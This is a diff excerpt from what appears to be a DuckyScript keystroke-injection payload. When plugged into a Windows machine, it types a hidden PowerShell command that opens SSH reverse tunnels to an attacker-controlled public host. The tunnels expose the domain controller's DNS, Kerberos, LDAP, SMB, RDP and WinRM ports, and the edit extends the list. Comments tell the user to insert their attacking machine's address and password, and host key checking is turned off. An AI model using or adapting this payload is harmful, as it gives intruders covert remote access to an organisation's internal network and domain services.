@@ -33,7 +33,7 @@ REM | In powershell, use "$env:LOGONSERVER.substring(2)", but must be variable s
 STRING $D=$env:LOGONSERVER.substring(2)
 ENTER
 REM ~~ | Change the username@IP to your attacking machine, on a public IP 
-STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$D":53 -R 10080:"$D":80 -R 10389:"$D":389 -R 10445:"$D":445 -R 13389:"$D":3389 -R 15985:"$D":5985 username@IP
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10021:"$D":21 -R 10053:"$D":53 -R 10080:"$D":80 -R 10088:"$D":88 -R 10135:"$D":135 -R 10139:"$D":139 -R 10389:"$D":389 -R 10443:"$D":443 -R 10445:"$D":445 -R 10464:"$D":464 -R 10636:"$D":636 -R 13268:"$D":3268 -R 13269:"$D":3269 -R 13389:"$D":3389 -R 15985:"$D":5985 -R 15986:"$D":5986 username@IP
 ENTER
 DELAY 2000
 REM ~~ | Change p@ssw0rd! below to the ssh user's password
